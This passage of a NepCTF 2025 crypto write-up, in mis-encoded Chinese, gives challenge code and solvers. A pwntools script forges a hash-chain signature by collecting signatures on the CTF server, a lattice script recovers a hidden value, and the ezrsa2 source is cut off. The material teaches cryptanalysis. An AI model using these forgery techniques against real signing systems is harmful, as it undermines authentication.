class="hljs-keyword">if</span> sk <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.sk  <br>        m = SM3(msg) <br>        m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>) <br>        a = [<span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span> * i: <span class="hljs-number">8</span> * i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.n // <span class="hljs-number">8</span>)]<br>        step = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span>;<br>        qq = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span> <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            step[i] = a[i] <br>            qq[i] = SM3_n(sk[i], step[i])<br>        <span class="hljs-built_in">sum</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">sum</span>[i] = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):<br>                <span class="hljs-keyword">if</span> m[j - <span class="hljs-number">1</span>] == <span class="hljs-variable language_">self</span>.hex_symbols[i]:<br>                    <span class="hljs-built_in">sum</span>[i] += j<br>            step[i + <span class="hljs-number">32</span>] = <span class="hljs-built_in">sum</span>[i] % <span class="hljs-number">255</span><br>            qq[i + <span class="hljs-number">32</span>] = SM3_n(sk[i + <span class="hljs-number">32</span>], step[i + <span class="hljs-number">32</span>]) <br>        <span class="hljs-keyword">return</span> [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> qq]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">self, msg, qq, pk=<span class="hljs-literal">None</span></span>):<br>        qq = [<span class="hljs-built_in">bytes</span>.fromhex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> qq]<br>        pk = pk <span class="hljs-keyword">if</span> pk <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.pk<br>        m = SM3(msg)<br>        m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)<br>        a = [<span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span> * i: <span class="hljs-number">8</span> * i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.n // <span class="hljs-number">8</span>)]<br>        step = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span>;<br>        pk_ = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            step[i] = a[i]<br>            pk_[i] = SM3_n(qq[i], <span class="hljs-number">255</span> - step[i])<br>        <span class="hljs-built_in">sum</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">sum</span>[i] = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):<br>                <span class="hljs-keyword">if</span> m[j - <span class="hljs-number">1</span>] == <span class="hljs-variable language_">self</span>.hex_symbols[i]:<br>                    <span class="hljs-built_in">sum</span>[i] += j<br>            step[i + <span class="hljs-number">32</span>] = <span class="hljs-built_in">sum</span>[i] % <span class="hljs-number">255</span><br>            pk_[i + <span class="hljs-number">32</span>] = SM3_n(qq[i + <span class="hljs-number">32</span>], <span class="hljs-number">255</span> - step[i + <span class="hljs-number">32</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> pk_ == pk <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;initializing...&#x27;</span>)<br>Sign = Nepsign()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">match</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt; &#x27;</span>)):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            msg = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg: &#x27;</span>)) <br>            <span class="hljs-keyword">if</span> msg != <span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span>: <br>                <span class="hljs-built_in">print</span>(Sign.sign(msg))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You can&#x27;t do that&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            qq = literal_eval(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;give me a qq: &#x27;</span>))<br>            <span class="hljs-keyword">if</span> Sign.verify(<span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq): <br>                <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a><strong>åˆ†æ</strong></h3><p>é¦–å…ˆæ˜ç¡®æˆ‘ä»¬çš„ç›®çš„ï¼Œæ˜¯è¦æ±‚å‡ºä¸€ä¸ªé•¿åº¦ä¸º48çš„<code>qq</code>åˆ—è¡¨ï¼Œè¿™ä¸ª<code>qq</code>åˆ—è¡¨ä¸­çš„<code>qq[i]</code>éƒ½æ˜¯<code>sk[i]</code>ç»è¿‡<code>step[i]</code>æ¬¡SM3å“ˆå¸Œä¹‹åå¾—åˆ°çš„å€¼ã€‚<br><strong>å…³é”®ç‚¹åˆ†æ</strong>ï¼š</p><ul><li>ç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“äº†æ˜æ–‡å°±æ˜¯<code>happy for NepCTF 2025</code>ï¼Œå› æ­¤æ ¹æ®é¢˜ç›®ç»™å‡ºçš„ç®—æ³•æˆ‘ä»¬èƒ½å¤Ÿæ±‚å‡º<code>step</code>åˆ—è¡¨</li><li>å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥æ— é™æ¬¡åœ°è¯·æ±‚ç­¾å</li><li>æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å¯¹<code>qq[i]</code>è¿›è¡Œ<code>step[i]</code>çš„å¢åŠ ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“SM3çš„ç®—æ³•<br>å› æ­¤ï¼Œæˆ‘ä»¬çš„æ€è·¯å·²ç»æ˜ç¡®ï¼Œå°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ª<code>qq</code>åºåˆ—ï¼Œä¿è¯å¯¹åº”æ¯ä¸ª<code>step[i]</code>éƒ½å°äºåŸæœ¬æ˜æ–‡çš„<code>step[i]</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡º<code>target_step[i]-step[i]</code>ï¼Œä»è€Œæ‰‹åŠ¨æ¢å¤å‡ºæ­£ç¡®çš„<code>qq</code>åºåˆ—ã€‚<br>æ³¨æ„ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™48ä¸ª<code>qq[i]</code>ç”±åŒä¸€æ¬¡ç­¾åå¾—å‡ºï¼Œå› ä¸ºæ¯ä¸ª<code>qq[i]</code>å’Œ<code>step[i]</code>çš„å¯¹åº”å…³ç³»è·Ÿå…¶ä»–çš„æ²¡æœ‰è”ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é‡å¤è¯·æ±‚ç­¾åï¼ŒçŸ¥é“æ¯ä¸ª<code>i</code>éƒ½æœ‰äº†å¯¹åº”çš„<code>qq[i]ã€step[i]</code>ä½¿å¾—<code>step[i]&lt;target_step[i]</code>ã€‚</li></ul><h3 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a><strong>è§£ç­”</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3<br><span class="hljs-keyword">import</span> os, ast, random, sys<br><br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>   <br><br>HEX = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> sm3.sm3_hash([b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3_n</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        data = <span class="hljs-built_in">bytes</span>.fromhex(SM3(data))<br>    <span class="hljs-keyword">return</span> data.<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">64</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_steps</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    m_hex = SM3(msg)<br>    m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m_hex, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)<br>    steps = [<span class="hljs-number">0</span>]*<span class="hljs-number">48</span><br><br>    <span class="hljs-comment"># å‰ 32 ä¸ªç›´æ¥å– 256bit å“ˆå¸Œçš„å„å­—èŠ‚</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        steps[i] = <span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span>*i:<span class="hljs-number">8</span>*i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># å 16 ä¸ªæŒ‰å‡ºç°ä½ç½®æ±‚å’Œå† mod 255</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        s = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(m_hex, <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> ch == HEX[i]:<br>                s += j<br>        steps[<span class="hljs-number">32</span>+i] = s % <span class="hljs-number">255</span><br>    <span class="hljs-keyword">return</span> steps<br><br>TARGET_MSG = <span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span><br>target_step = calc_steps(TARGET_MSG)<br><br>HOST, PORT = <span class="hljs-string">&#x27;nepctf30-yctq-jzxl-h59c-3yzhv08pk172.nepctf.com&#x27;</span>,<span class="hljs-number">443</span> <br>io = remote(HOST, PORT , ssl = <span class="hljs-literal">True</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;initializing&#x27;</span>) <br><br>collected_q  = [<span class="hljs-literal">None</span>]*<span class="hljs-number">48</span><br>collected_st = [<span class="hljs-literal">None</span>]*<span class="hljs-number">48</span><br>need = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>))<br><br><br><br>log.info(<span class="hljs-string">&#x27;[*] Start collecting chain values â€¦&#x27;</span>)<br><br><span class="hljs-keyword">while</span> need:<br><br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    rnd_msg = os.urandom(<span class="hljs-number">16</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;msg: &#x27;</span>, rnd_msg.<span class="hljs-built_in">hex</span>().encode())<br><br>    sig_line = io.recvline().strip().decode()<br>    <span class="hljs-keyword">try</span>:<br>        sig_list = ast.literal_eval(sig_line)<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">isinstance</span>(sig_list, <span class="hljs-built_in">list</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(sig_list) == <span class="hljs-number">48</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        log.error(<span class="hljs-string">f&#x27;parse sign fail: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    cur_step = calc_steps(rnd_msg)<br><br>    updated = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(need): <br>        <span class="hljs-keyword">if</span> cur_step[i] &lt;= target_step[i]:<br>            collected_q[i]  = sig_list[i]<br>            collected_st[i] = cur_step[i]<br>            need.remove(i)<br>            updated = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> updated:<br>        log.info(<span class="hljs-string">f&#x27;   progress: <span class="hljs-subst">&#123;<span class="hljs-number">48</span>-<span class="hljs-built_in">len</span>(need)&#125;</span>/48 collected&#x27;</span>)<br><br>log.success(<span class="hljs-string">&#x27;[+] All indices satisfied, forging final signature â€¦&#x27;</span>)<br><br>final_qq = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    delta = target_step[i] - collected_st[i]<br>    q_hex = collected_q[i]<br>    <span class="hljs-keyword">if</span> delta:<br>        q_hex = SM3_n(<span class="hljs-built_in">bytes</span>.fromhex(q_hex), delta)<br>    final_qq.append(q_hex)<br><br>log.info(<span class="hljs-string">f&#x27;Final qq: <span class="hljs-subst">&#123;final_qq&#125;</span>&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;give me a qq: &#x27;</span>, <span class="hljs-built_in">str</span>(final_qq).encode())<br><br>flag = io.recvline_contains(<span class="hljs-string">b&#x27;NepCTF&#x27;</span>).decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="LatticeBros"><a href="#LatticeBros" class="headerlink" title="LatticeBros"></a>LatticeBros</h2><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å·²çŸ¥Î±çš„æå°å¤šé¡¹å¼ä¸ºä¸‰æ¬¡å¤šé¡¹å¼f(x),å³f(Î±)=0,ä¸”Î±â‰ˆ54236.606188881754809671280151541781895183337725393</span><br><span class="hljs-comment">#ä¸Šè¿°æå°å¤šé¡¹å¼çš„å¸¸æ•°é¡¹ä¸ºa0</span><br><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> a0,alpha<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt,log2<br><br>d=<span class="hljs-number">981020902672546902438782010902608140583199504862558032616415</span><br>p = d - a0<br><br>k=sqrt(log2(p))+log2(log2(p))<br>B = <span class="hljs-number">2</span>**<span class="hljs-number">30</span><br><span class="hljs-keyword">assert</span> B &lt; p/<span class="hljs-number">2</span>**k<br><br>m = <span class="hljs-number">30</span><br><span class="hljs-keyword">assert</span> m &gt; <span class="hljs-number">2</span>*sqrt(log2(p))<br><br>samples = []<br>betas = []<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;samples.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    t = random.randint(<span class="hljs-number">1</span>, p-<span class="hljs-number">1</span>)<br>    beta = random.randint(-B + <span class="hljs-number">1</span>, B - <span class="hljs-number">1</span>)<br>    a = (t * alpha - beta) % p<br>    samples.append((t, a))<br>    betas.append(beta)<br><br>f.write(<span class="hljs-built_in">str</span>(samples))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">assert</span> (betas[i]-samples[i][<span class="hljs-number">0</span>]*alpha+samples[i][<span class="hljs-number">1</span>])%p == <span class="hljs-number">0</span><br><br><span class="hljs-comment">#flag = long_to_bytes(alpha)</span><br></code></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å·²çŸ¥$\alpha$çš„æå°å¤šé¡¹å¼æ˜¯ä¸‰æ¬¡å¤šé¡¹å¼ï¼Œä¸”$f(\alpha)&#x3D;0$ï¼Œå³<br>$\alpha^3 + a_2\alpha^2 + a_1\alpha +a_0&#x3D;0$</p><p>å¯ä»¥æ„é€ æ ¼ï¼š</p><span>$$(1,a_2,a_1,a_0)\begin{pmatrix}1 & 0 & 0 & \alpha^{3} C \\0 & 1 & 0 & \alpha^{2} C \\0 & 0 & 1 & \alpha C \\0 & 0 & 0 & C \end{pmatrix}\\=(1,a_2,a_1,\epsilon C)$$</span><p>å…¶ä¸­$\epsilon$æ¥è¿‘0ï¼Œåˆ™$\epsilon C$æ¥è¿‘0ã€‚æ ¼åŸºè§„çº¦å°±å¯ä»¥æ±‚å‡º$a_2ã€a_1$ï¼Œç„¶åå¸¦å›æ–¹ç¨‹å¼æ±‚å‡º$a_0$ï¼Œä¹‹åå°±æ˜¯æ­£å¸¸çš„HNPé—®é¢˜ã€‚</p><h3 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;samples.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    samples_str = f.read()<br>    samples = ast.literal_eval(samples_str)<br><br>d = <span class="hljs-number">981020902672546902438782010902608140583199504862558032616415</span><br>alpha = <span class="hljs-number">54236.606188881754809671280151541781895183337725393</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    C = <span class="hljs-number">2</span>^i<br>    M = matrix(QQ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,C*alpha^<span class="hljs-number">3</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,C*alpha^<span class="hljs-number">2</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,C*alpha],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,C]])<br><br>    L = M.LLL()<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> L:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(l[<span class="hljs-number">0</span>]) == <span class="hljs-number">1</span>:<br>            r = l<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#print(r)</span><br>    a1 = r[<span class="hljs-number">2</span>]<br>    a2 = r[<span class="hljs-number">1</span>]<br>    a0 = <span class="hljs-built_in">int</span>(-alpha^<span class="hljs-number">3</span> - a2*alpha^<span class="hljs-number">2</span> - a1*alpha)<br>    p = d - a0<br>    <span class="hljs-comment">#print(p)</span><br><br>    a_list = []<br>    t_list = []<br>    <span class="hljs-keyword">for</span> t, a <span class="hljs-keyword">in</span> samples:<br>        a_list.append(a)<br>        t_list.append(t)<br>    n = <span class="hljs-built_in">len</span>(t_list)<br><br>    kbits = <span class="hljs-number">30</span><br>    K = <span class="hljs-number">2</span> ^ kbits -<span class="hljs-number">1</span><br>    <span class="hljs-comment">#print(t_list)</span><br>    M = Matrix(QQ,n+<span class="hljs-number">2</span>,n+<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        M[i,i] = p<br>        M[-<span class="hljs-number">2</span>,i] = t_list[i]<br>        M[-<span class="hljs-number">1</span>,i] = -a_list[i]<br>    b = K/p<br>    M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = b<br>    M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = K<br>    <span class="hljs-comment">#print(M)</span><br>    L2 = M.LLL()<br>    x = L2[<span class="hljs-number">1</span>][-<span class="hljs-number">2</span>] // b % p<br>    ans = long_to_bytes(x)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NepCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(ans)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="ezrsa2"><a href="#ezrsa2" class="headerlink" title="ezrsa2"></a>ezrsa2</h2><h3 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_parameters</span>(<span class="hljs-params">gamma=<span class="hljs-number">0.33</span>, beta=<span class="hljs-number">0.33</span></span>):<br>    p = getStrongPrime(<span class="hljs-number">1024</span>)<br>    q = getStrongPrime(<span class="hljs-number">1024</span>)<br>    N = p*q<br>    phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        d = getRandomNBitInteger(<span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>*beta))<br>        <span class="hljs-keyword">if</span> GCD(d, phi) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>    e = inverse(d, phi)<br>    <br>    hints = []<br>    M = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(sieve_base)):<br>        li = sieve_base[i]  <span class="hljs-comment">#ç´ æ•°</span><br>        hints.append(d%li)<br>        M *= li<br>        <span class="hljs-keyword">if</span> M.bit_length() &gt;= <span class="hljs-number">1024</span>*gamma:<br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">return</span> e, N, hints<br><br><br><br><span 